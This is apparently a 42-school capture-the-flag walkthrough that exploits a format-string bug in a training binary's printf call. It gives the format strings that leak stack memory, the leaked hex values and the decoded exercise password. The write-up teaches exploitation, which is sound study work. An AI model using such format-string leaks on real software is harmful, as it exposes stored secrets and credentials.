# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    walkthrough                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2019/05/14 03:50:07 by lgarczyn          #+#    #+#              #
#    Updated: 2019/05/22 17:48:50 by lgarczyn         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

The penultimate call (printf) has a vulnerability: 
it simply calls printf using the provided username as the format string

The key is stored at $rbp - 0xA0, or 160 byte behind the stack pointer

This means that at printf position 21, I should find 40 ASCII characters

We use the format string:
> %21$016llx %22$016llx %23$016llx %24$016llx %25$016llx

It appears that we have an off-by-one error

We use the format string:
> %22$016llx %23$016llx %24$016llx %25$016llx %26$016llx

We get:

> 756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d

We reverse each because of endianess

> 4868373452506e75 51397361354a4145 58674e5743717a37 7358476e68354a35 4d394b6650673348

Which we convert to ASCII using xdd -r -p

> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
